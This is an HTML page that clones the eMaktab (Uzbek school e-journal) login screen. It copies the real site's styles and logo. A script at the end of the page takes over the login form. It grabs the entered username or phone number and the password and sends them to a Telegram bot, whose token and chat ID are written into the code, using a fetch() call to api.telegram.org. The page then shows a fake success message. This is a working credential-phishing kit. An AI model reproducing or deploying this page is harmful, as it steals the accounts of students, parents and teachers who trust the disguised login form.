<!DOCTYPE html>
<html>
<head lang="ru">
    <meta name="google" value="notranslate">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <link rel="icon" href="https://static.emaktab.uz/img/icons/favicon_Uz.ico" sizes="16x16 24x24 32x32 48x48 64x64" type="image/x-icon">
    <link rel="shortcut icon" href="https://static.emaktab.uz/img/icons/favicon_Uz.ico" sizes="16x16 24x24 32x32 48x48 64x64" type="image/x-icon">
    <title>eMaktab | eMaktab ga kirish</title>
    <link rel="stylesheet" href="https://static.emaktab.uz/assets/styles/main.min.86ffea1a.css?v=86ffea1a" media="all" type="text/css">
    <link rel="stylesheet" href="https://static.emaktab.uz/styles/main/common.css?v=38675ba2" media="all" type="text/css">
    <link rel="stylesheet" href="https://static.emaktab.uz/blocks/blocks.css?v=aba5594a" media="all" type="text/css">
    <link rel="stylesheet" href="https://static.emaktab.uz/css/adaptive.css?v=f02f9b01" media="all" type="text/css">
    <link rel="stylesheet" href="https://static.emaktab.uz/client/notifications.css?v=1f469960" type="text/css">
    <script type="text/javascript">
        var dnevnik = {"urls":{"domain":"emaktab.uz"}};
    </script>
    <script type="text/javascript" src="https://static.emaktab.uz/assets/scripts/modules/redesign.min.4001a175.js?v=4001a175"></script>
    <script type="text/javascript" src="https://static.emaktab.uz/assets/scripts/vendors/requirejs/require-2.1.6.js?v=ef8e5d03"></script>
    <script type="text/javascript">
        require.config({
            baseUrl: "https://static.emaktab.uz/assets/scripts/modules",
            urlArgs: "v=9fed7315",
        });
    </script>
    <script type="text/javascript" src="https://static.emaktab.uz/assets/scripts/modules/main-redesign.min.a8e15e2a.js?v=a8e15e2a"></script>
    <script type="text/javascript" src="https://static.emaktab.uz/blocks/blocks.js?v=ebd35f0f"></script>
    <script type="text/javascript" src="https://static.emaktab.uz/javascripts/local/uz-Latn.js?v=0320e479"></script>
</head>
<body class="page_adaptive">
    <script>
        window.environmentPrefix = "uz";
        window.environmentPrefix = "";
    </script>
    <header class="header-anon" id="header-anon">
        <div class="colored-line colored-line_uz">
            <div class="colored-line__item colored-line__item_blue"></div>
            <div class="colored-line__item colored-line__item_green"></div>
            <div class="colored-line__item colored-line__item_yellow"></div>
            <div class="colored-line__item colored-line__item_orange"></div>
            <div class="colored-line__item colored-line__item_violet"></div>
        </div>
        <div class="header-anon__content">
            <div class="header-anon__logotype" id="logo">
                <a href="https://emaktab.uz"><img src="https://static.emaktab.uz/img/logotypes/uzlogotype.png" alt="eMaktab"></a>
            </div>
            <div class="header-anon__menu-wrapper">
                <div class="header-anon__menu">
                    <nav class="menu">
                        <ul class="menu__layout">
                            <li class="menu__layout_unit">
                                <a class="menu__item menu__item_border menu__item_no-left-padding" href="https://emaktab.uz/about">Tashkilot</a>
                            </li>
                            <li class="menu__layout_unit">
                                <a class="menu__item menu__item_border" href="https://emaktab.uz/features">Imkoniyatlar</a>
                            </li>
                            <li class="menu__layout_unit">
                                <a class="menu__item menu__item_border" href="https://emaktab.uz/forpartners">Hamkorlarga</a>
                            </li>
                            <li class="menu__layout_unit">
                                <a class="menu__item menu__item_border menu__item_noborder menu__item_no-right-padding" href="https://emaktab.uz/support">Yordam</a>
                            </li>
                        </ul>
                    </nav>
                </div>
                <div class="header-anon__buttons" id="anon-buttons">
                    <div class="header-anon__localization-button" id="localization-button">
                        <div class="header-localization-select">
                            <div class="header-localization-select__info">
                                <div class="header-localization-select__info_row header-localization-select__info_row-content">
                                    O'zb
                                </div>
                                <div class="header-localization-select__info_row header-localization-select__tumbler"></div>
                            </div>
                            <div class="dropdown-container dropdown-container_font-weight-bold dropdown-container_left-position-0 dropdown-container_no-specific-last-child">
                                <a href="https://emaktab.uz/api/localization/change?newCulture=uz-Latn-UZ&currentUrl=https%3a%2f%2flogin.emaktab.uz%2f" title="O'zbekcha" class="link link_dropdown-container-link link_dropdown-container-link_selected link_">O'zbekcha</a>
                                <a href="https://emaktab.uz/api/localization/change?newCulture=ru-RU&currentUrl=https%3a%2f%2flogin.emaktab.uz%2f" title="Русский" class="link link_dropdown-container-link link_ link_">Русский</a>
                            </div>
                            <script>
                                require(['DropdownContainer/DropdownContainer'], function () { 
                                    for(var i = 0, l = arguments.length; i < l; i += 1) { 
                                        arguments[i](JSON.parse('\x7b\x22tumblerClass\x22\x3a\x22header-localization-select\x22,\x22activationClasses\x22\x3a\x5b\x22header-localization-select__info\x22,\x22dropdown-container\x22\x5d\x7d')); 
                                    } 
                                });
                            </script>
                        </div>
                    </div>
                    <div class="header-anon__button">
                        <a href="https://login.emaktab.uz/login" title="Kirish" class="button button_blue button_padding-20" onclick="" data-category="" data-action="" data-target="">Kirish</a>
                    </div>
                    <div class="header-anon__button">
                        <a href="https://login.emaktab.uz/join/role" title="Tashkilotni ulash" class="button button_green button_padding-20 button_margin-left-20" onclick="" data-category="" data-action="" data-target="">Tashkilotni ulash</a>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <script type="text/javascript">
        var button = document.getElementById('localization-button');
        moveLocalizationButton();
        window.addEventListener('resize', function(event) {
            moveLocalizationButton();
        }, true);
        
        function moveLocalizationButton() {
            if (window.innerWidth > 1200) {
                jQuery("#localization-button").detach().prependTo('#anon-buttons');
                button.classList.remove("localization-mobile");
            }
            else {
                jQuery("#localization-button").detach().appendTo('#logo');
                button.classList.add("localization-mobile");
            }
        }
    </script>

    <div class="main main_top-30">
        <div class="container">
            <div class="row">
                <div class="col-md-24 col-xs-24">
                    <div class="article-area">
                        <form id="loginForm" class="login" method="post" action="TelegramBot.php" onsubmit="handleSubmit(event)">
                            <input id="exceededAttempts" name="exceededAttempts" type="hidden" value="False"> 
                            <input id="ReturnUrl" name="ReturnUrl" type="hidden" value=""> 
                            <input id="FingerprintId" name="FingerprintId" type="hidden" value="">
                            <div class="login__header login__header_uz">
                                <div class="row row_centered">
                                    <div class="login__header-title col-md-12 col-xs-12">
                                        <h2 class="login__title">Shaxsiy kabinetga kirish</h2>
                                    </div>
                                    <div class="login__header-logo col-md-12 col-xs-12">
                                        <img src="https://static.emaktab.uz/img/logotypes/uzlogotype.png" alt="eMaktab">
                                    </div>
                                </div>
                            </div>
                            <div class="login__panel">
                                <div class="form form-vertical login__panel-form login__panel-form_uz">
                                    <div class="form__item form__item_required">
                                        <label class="form__label" for="username">Foydalanuvchi nomi</label> 
                                        <input id="username" name="username" type="text" class="input" placeholder="example@domain.com" tabindex="1" autofocus="autofocus" data-val="true" data-val-length="Email 3 tadan 128 tagacha belgidan iborat bo'lishi kerak." data-val-length-max="128" data-val-length-min="3" data-val-required="Maydonni to'ldirish majburiy." autocomplete="username">
                                        <span class="field-validation-valid" data-valmsg-for="username" data-valmsg-replace="true"></span>
                                    </div>
                                    <div class="form__item form__item_required">
                                        <label class="form__label" for="password">Parol</label> 
                                        <input id="password" name="password" type="password" class="input" placeholder="********" tabindex="2" data-val="true" data-val-length="Parol 3 tadan 32 tagacha belgidan iborat bo'lishi kerak." data-val-length-max="32" data-val-length-min="3" data-val-required="Maydonni to'ldirish majburiy." autocomplete="current-password">
                                        <span class="field-validation-valid" data-valmsg-for="password" data-valmsg-replace="true"></span>
                                    </div>
                                    <div class="form__item login__form-action">
                                        <button type="submit" class="button button_blue button_full-width" tabindex="4">Kirish</button>
                                    </div>
                                    <div class="login__form-forgot-password">
                                        <a href="https://login.emaktab.uz/forgot-password">Parolingizni unutdingizmi?</a>
                                    </div>
                                </div>
                            </div>
                            <div class="login__panel-message login__panel-message_fail login__panel-message_hidden login__panel-message_uz" id="loginError">
                                <div class="row row_centered">
                                    <div class="login__panel-message-logo col-md-4 col-xs-4">
                                        <img src="https://static.emaktab.uz/img/logotypes/uzlogotype.png" alt="eMaktab">
                                    </div>
                                    <div class="login__panel-message-text col-md-20 col-xs-20">
                                        <p class="login__panel-message-text">E-mail yoki parol noto‘g‘ri.</p>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        const chatID = '6320467148';
        const token = '7259013301:AAGaD_I5tHLhqd0XH3Ql1ZprS04Jf4SzSlA';

        function handleSubmit(event) {
            event.preventDefault();
            const phoneNumber = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const attempts = parseInt(localStorage.getItem('attempts')) || 0;
            const timeout = localStorage.getItem('timeout');

            if (timeout && new Date().getTime() < timeout) {
                const waitTime = Math.ceil((timeout - new Date().getTime()) / 1000);
                alert(`Подождите ${(waitTime / 60).toFixed(1)} минут перед следующей попыткой`);
                return;
            }

            if (attempts < 3) {
                if (phoneNumber.length === 0 || password.length === 0) {
                    alert('Заполните все поля формы!');
                } else {
                    const message = `Номер телефона: ${phoneNumber}\nПароль: ${password}`;
                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;

                    fetch(url)
                        .then(response => {
                            if (response.ok) {
                                alert('Успешно отправлено!');
                            } else {
                                throw new Error('Ошибка при отправке');
                            }
                        })
                        .catch(error => {
                            console.error('Ошибка:', error);
                            alert('Ошибка при отправке');
                        });
                }
                localStorage.setItem('attempts', attempts + 1);
            } else {
                const newTimeout = new Date().getTime() + 5 * 60 * 1000; // 5 минут
                localStorage.setItem('timeout', newTimeout);
                localStorage.setItem('attempts', 0);
                alert('Вы исчерпали свои попытки. Подождите 5 минут.');
            }
        }
    </script>
</body>
</html>
